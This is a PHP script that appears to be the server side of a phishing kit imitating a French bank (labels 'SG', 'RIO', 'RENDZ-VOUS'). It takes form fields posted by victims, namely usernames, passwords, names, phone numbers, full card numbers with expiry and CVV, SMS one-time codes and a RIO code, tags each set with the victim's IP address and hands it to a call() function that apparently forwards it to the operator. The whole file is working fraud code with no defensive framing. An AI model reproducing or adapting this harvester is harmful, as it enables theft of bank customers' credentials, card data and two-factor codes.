<?php 
@session_start();
require '../main.php';

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$host = $_SERVER["SERVER_NAME"];

function hit($link){
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, $link);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	$res = curl_exec($c);
	curl_close($c);
	return $res;
}

 

if(isset($_POST['user'])){

$text = "
/- SG LOGIN -/ $ip
USER :  ".$_POST['user']."
PASS : ".$_POST['pass']."
";
	

return call($text);
	
}






if(isset($_POST['phone'])){

$text = "
/- SG INFO -/ $ip
Name : ".$_POST['name']."
Phone : ".$_POST['phone'];
	

return call($text);

	
}



if(isset($_POST['cc'])){

$text = "
/- SG CARD -/ $ip
Name : ".$_POST['name']."
CC : ".$_POST['cc']."
EXP : ".$_POST['exp']."
CVV : ".$_POST['cvv']."
";
	

return call($text);

	
}







if(isset($_POST['sms'])){
	
$text = "
/- SG SMS -/ $ip
CODE : ".$_POST['sms']."
";
	
return call($text);
}
 


if(isset($_POST['rio'])){

$text = "
/- SG CODE RIO -/ $ip
CODE : ".$_POST['rio']."
";
	
return call($text);
}
	
 

if(isset($_POST['inst'])){

$text = "/- SG INSTRUCTIONS -/ $ip
ANSWER : ".$_POST['inst']."
";	
return call($text);
}
	

if(isset($_POST['insts'])){
call("/- SG INST 2 -/
Day: ".$_POST['day']."
Hour: ".$_POST['hour']."
Type: RENDZ-VOUS!");
return;
} 
 

?>